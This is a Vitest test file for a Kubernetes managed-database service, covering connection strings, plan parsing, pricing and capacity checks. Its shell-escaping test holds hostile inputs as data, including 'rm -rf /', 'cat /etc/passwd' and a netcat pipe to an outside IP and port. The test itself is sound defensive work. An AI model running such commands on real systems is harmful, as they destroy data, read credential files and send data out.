import { describe, it, expect, vi } from 'vitest';

vi.mock('@/lib/prisma', () => ({
  prisma: {
    plan: {
      findFirst: vi.fn(),
      findMany: vi.fn(),
      create: vi.fn(),
      update: vi.fn(),
      delete: vi.fn(),
    },
    setting: {
      findMany: vi.fn(),
      findUnique: vi.fn(),
      upsert: vi.fn(),
    },
    subscription: {
      count: vi.fn(),
    },
    databaseService: {
      findMany: vi.fn().mockResolvedValue([]),
      count: vi.fn().mockResolvedValue(0),
    },
  },
}));

vi.mock('../prisma', () => ({
  prisma: {
    plan: {
      findFirst: vi.fn(),
      findMany: vi.fn(),
      create: vi.fn(),
      update: vi.fn(),
      delete: vi.fn(),
    },
    setting: {
      findMany: vi.fn().mockResolvedValue([]),
      findUnique: vi.fn(),
      upsert: vi.fn(),
    },
    subscription: {
      count: vi.fn(),
    },
    databaseService: {
      findMany: vi.fn().mockResolvedValue([]),
      count: vi.fn().mockResolvedValue(0),
    },
  },
}));

import {
  buildConnectionDetails,
  parseDatabasePlanLimits,
  DatabaseServiceRecord,
} from '../k8s-database';
import { OFFICIAL_DATABASE_PLANS } from '../database-plans';

const baseDb: DatabaseServiceRecord = {
  id: 123,
  userId: 1,
  name: 'myapp',
  type: 'MYSQL',
  version: '8.0',
  planName: 'Shared Database',
  region: 'Sidoarjo',
  node: 'managed-database',
  host: 'db.masdika.id',
  port: 30555,
  dbName: 'db_myapp_123',
  username: 'u_myapp_123',
  password: 'TestMockPass123!', // test-secret
  cpuShares: 0.5,
  memoryMb: 1024,
  storageGb: 10,
  status: 'RUNNING',
};

describe('Managed Database K3s Engine - k8s-database.ts', () => {
  describe('buildConnectionDetails', () => {
    it('should build proper connection details and Laravel .env for MySQL', () => {
      const details = buildConnectionDetails(baseDb);
      expect(details.uri.startsWith('mysql://')).toBe(true);
      expect(details.uri).toContain(`${baseDb.username}:${baseDb.password}@db.masdika.id:30555/db_myapp_123`);
      expect(details.laravelEnv).toContain('DB_CONNECTION=mysql');
      expect(details.laravelEnv).toContain('DB_HOST=db.masdika.id');
      expect(details.laravelEnv).toContain('DB_PORT=30555');
      expect(details.laravelEnv).toContain('DB_DATABASE=db_myapp_123');
      expect(details.pmaUrl).toContain('https://pma.db.masdika.id');
    });

    it('should build proper connection details for PostgreSQL', () => {
      const pgDb: DatabaseServiceRecord = {
        ...baseDb,
        type: 'POSTGRES',
        version: '16',
        port: 30556,
      };
      const details = buildConnectionDetails(pgDb);
      expect(details.uri.startsWith('postgresql://')).toBe(true);
      expect(details.uri).toContain(`${pgDb.username}:${pgDb.password}@db.masdika.id:30556/db_myapp_123?sslmode=prefer`);
      expect(details.laravelEnv).toContain('DB_CONNECTION=pgsql');
      expect(details.pgadminUrl).toBe('https://pgadmin.db.masdika.id');
    });

    it('should build proper connection details for MongoDB with authSource and mongoUrl', () => {
      const mongoDb: DatabaseServiceRecord = {
        ...baseDb,
        type: 'MONGODB',
        version: '7.0',
        port: 30557,
      };
      const details = buildConnectionDetails(mongoDb);
      expect(details.uri.startsWith('mongodb://')).toBe(true);
      expect(details.uri).toContain(`${mongoDb.username}:${mongoDb.password}@db.masdika.id:30557/db_myapp_123?authSource=admin`);
      expect(details.mongoUrl).toBe(`https://db-${mongoDb.id}-mongo.db.masdika.id`);
      expect(details.mongoExpressUrl).toBe(`https://db-${mongoDb.id}-mongo.db.masdika.id`);
      expect(details.laravelEnv).toContain('DB_CONNECTION=mongodb');
    });

    it('should build proper connection details for Redis with redisUrl and redisCommanderUrl', () => {
      const redisDb: DatabaseServiceRecord = {
        ...baseDb,
        type: 'REDIS',
        version: '7.2',
        port: 30558,
      };
      const details = buildConnectionDetails(redisDb);
      expect(details.uri.startsWith('redis://')).toBe(true);
      expect(details.uri).toContain(`default:${encodeURIComponent(redisDb.password ?? '')}@db.masdika.id:30558`);
      expect(details.redisUrl).toBe(`https://db-${redisDb.id}-redis.db.masdika.id`);
      expect(details.redisCommanderUrl).toBe(`https://db-${redisDb.id}-redis.db.masdika.id`);
      expect(details.laravelEnv).toContain('REDIS_CLIENT=phpredis');
      expect(details.laravelEnv).toContain('REDIS_HOST=db.masdika.id');
      expect(details.laravelEnv).toContain('REDIS_PORT=30558');
    });
  });

  describe('parseDatabasePlanLimits', () => {
    it('should parse Shared Database limits correctly', () => {
      const limits = parseDatabasePlanLimits('{"cpu":"0.5 vCPU","ram":"1 GB","storage":"10 GB","shared":true}');
      expect(limits.cpuShares).toBe(0.5);
      expect(limits.memoryMb).toBe(1024);
      expect(limits.storageGb).toBe(10);
      expect(limits.shared).toBe(true);
    });

    it('should parse 5 Dedicated tier limits accurately', () => {
      // 1. Dedicated Nano (500m / 0.5 vCPU)
      const nano = parseDatabasePlanLimits('{"cpu":"500m Dedicated","ram":"1 GB","storage":"10 GB","shared":false}');
      expect(nano.cpuShares).toBe(0.5);
      expect(nano.memoryMb).toBe(1024);
      expect(nano.storageGb).toBe(10);
      expect(nano.shared).toBe(false);

      // 2. Dedicated Micro (1 vCPU / 1000m)
      const micro = parseDatabasePlanLimits('{"cpu":"1 vCPU (1000m)","ram":"2 GB","storage":"15 GB","shared":false}');
      expect(micro.cpuShares).toBe(1);
      expect(micro.memoryMb).toBe(2048);
      expect(micro.storageGb).toBe(15);
      expect(micro.shared).toBe(false);

      // 3. Dedicated Small (2 vCPU / 2000m)
      const small = parseDatabasePlanLimits('{"cpu":"2 vCPU (2000m)","ram":"4 GB","storage":"25 GB","shared":false}');
      expect(small.cpuShares).toBe(2);
      expect(small.memoryMb).toBe(4096);
      expect(small.storageGb).toBe(25);
      expect(small.shared).toBe(false);

      // 4. Dedicated Medium (3 vCPU / 3000m)
      const medium = parseDatabasePlanLimits('{"cpu":"3 vCPU (3000m)","ram":"6 GB","storage":"40 GB","shared":false}');
      expect(medium.cpuShares).toBe(3);
      expect(medium.memoryMb).toBe(6144);
      expect(medium.storageGb).toBe(40);
      expect(medium.shared).toBe(false);

      // 5. Dedicated Pro (4 vCPU / 4000m)
      const pro = parseDatabasePlanLimits('{"cpu":"4 vCPU (4000m)","ram":"8 GB","storage":"60 GB","shared":false}');
      expect(pro.cpuShares).toBe(4);
      expect(pro.memoryMb).toBe(8192);
      expect(pro.storageGb).toBe(60);
      expect(pro.shared).toBe(false);
    });
  });

  describe('Official Managed Database Plan Catalog', () => {
    it('should have official tiers matching SumoPod flavors (1 Shared + 6 Dedicated)', () => {
      expect(OFFICIAL_DATABASE_PLANS).toHaveLength(7);
      const names = OFFICIAL_DATABASE_PLANS.map((p) => p.name);
      expect(names).toEqual([
        'Shared Database',
        'Dedicated 1 vCPU / 1 GB',
        'Dedicated 1 vCPU / 2 GB',
        'Dedicated 2 vCPU / 2 GB',
        'Dedicated 2 vCPU / 4 GB',
        'Dedicated 2 vCPU / 8 GB',
        'Dedicated 4 vCPU / 8 GB',
      ]);
    });

    it('should include MongoDB engine in all plans', () => {
      for (const plan of OFFICIAL_DATABASE_PLANS) {
        expect(plan.limits.engines).toContain('MongoDB');
        expect(plan.limits.engines).toContain('MySQL');
        expect(plan.limits.engines).toContain('MariaDB');
        expect(plan.limits.engines).toContain('PostgreSQL');
      }
    });

    it('should match accurate pricing and resource scaling', () => {
      const nano = OFFICIAL_DATABASE_PLANS.find((p) => p.name === 'Dedicated 1 vCPU / 1 GB')!;
      expect(nano.price).toBe(30000);
      expect(nano.hourlyPrice).toBe(42);
      expect(nano.limits.cpu).toBe('1 vCPU');

      const pro = OFFICIAL_DATABASE_PLANS.find((p) => p.name === 'Dedicated 4 vCPU / 8 GB')!;
      expect(pro.price).toBe(400000);
      expect(pro.hourlyPrice).toBe(555);
      expect(pro.limits.ram).toBe('8 GB');
    });
  });

  describe('Database Lifecycle Actions (Power & Restart)', () => {
    it('should export restartDatabase, stopDatabase, startDatabase functions', async () => {
      const { restartDatabase, stopDatabase, startDatabase } = await import('../k8s-database');
      expect(typeof restartDatabase).toBe('function');
      expect(typeof stopDatabase).toBe('function');
      expect(typeof startDatabase).toBe('function');
    });
  });

  describe('Security Hardening & Shell Injection Prevention', () => {
    it('should correctly escape shell arguments preventing injection and command substitution', async () => {
      const { escapeShellArg } = await import('../k8s-database');

      // Basic string
      expect(escapeShellArg('simple')).toBe("'simple'");

      // Command substitution $(whoami) and backticks `id`
      expect(escapeShellArg('$(whoami)')).toBe("'$(whoami)'");
      expect(escapeShellArg('`rm -rf /`')).toBe("'`rm -rf /`'");

      // Semicolons and chained commands
      expect(escapeShellArg('foo; rm -rf /; bar')).toBe("'foo; rm -rf /; bar'");

      // Internal single quotes escaping
      expect(escapeShellArg("user's; cat /etc/passwd")).toBe("'user'\\''s; cat /etc/passwd'");

      // Redirection and pipe symbols
      expect(escapeShellArg('input | nc 1.2.3.4 4444 > /tmp/out')).toBe("'input | nc 1.2.3.4 4444 > /tmp/out'");

      // Environment variable expansion
      expect(escapeShellArg('$SECRET_KEY')).toBe("'$SECRET_KEY'");
    });
  });

  describe('Database Cluster Capacity & Resource Pre-Flight Checks', () => {
    it('should accurately parse Kubernetes memory strings (Ki, Mi, Gi, Ti, bytes)', async () => {
      const { parseK8sMemoryToMb } = await import('../k8s-database');
      expect(parseK8sMemoryToMb('7981016Ki')).toBe(7794);
      expect(parseK8sMemoryToMb('1024Mi')).toBe(1024);
      expect(parseK8sMemoryToMb('8Gi')).toBe(8192);
      expect(parseK8sMemoryToMb('1Ti')).toBe(1048576);
      expect(parseK8sMemoryToMb('1073741824')).toBe(1024);
      expect(parseK8sMemoryToMb(null)).toBe(0);
    });

    it('should accurately parse Kubernetes CPU strings (millicores, cores)', async () => {
      const { parseK8sCpuToCores } = await import('../k8s-database');
      expect(parseK8sCpuToCores('4')).toBe(4);
      expect(parseK8sCpuToCores('4000m')).toBe(4);
      expect(parseK8sCpuToCores('500m')).toBe(0.5);
      expect(parseK8sCpuToCores('1.5')).toBe(1.5);
      expect(parseK8sCpuToCores(null)).toBe(0);
    });

    it('should validate capacity and reject orders exceeding cluster capacity', async () => {
      const { checkDatabaseClusterCapacity } = await import('../k8s-database');
      const normal = await checkDatabaseClusterCapacity(1, 1024, 1);
      expect(normal.available).toBe(true);
      expect(normal.status).toBe('HEALTHY');

      // Exceeding CPU capacity
      const excessCpu = await checkDatabaseClusterCapacity(999, 1024, 1);
      expect(excessCpu.available).toBe(false);
      expect(excessCpu.status).toBe('FULL');
      expect(excessCpu.userMessage).toContain('Managed Database cluster cannot accommodate');

      // Exceeding RAM capacity
      const excessRam = await checkDatabaseClusterCapacity(1, 999999, 1);
      expect(excessRam.available).toBe(false);
      expect(excessRam.status).toBe('FULL');
      expect(excessRam.userMessage).toContain('Managed Database cluster cannot accommodate');
    });
  });
});
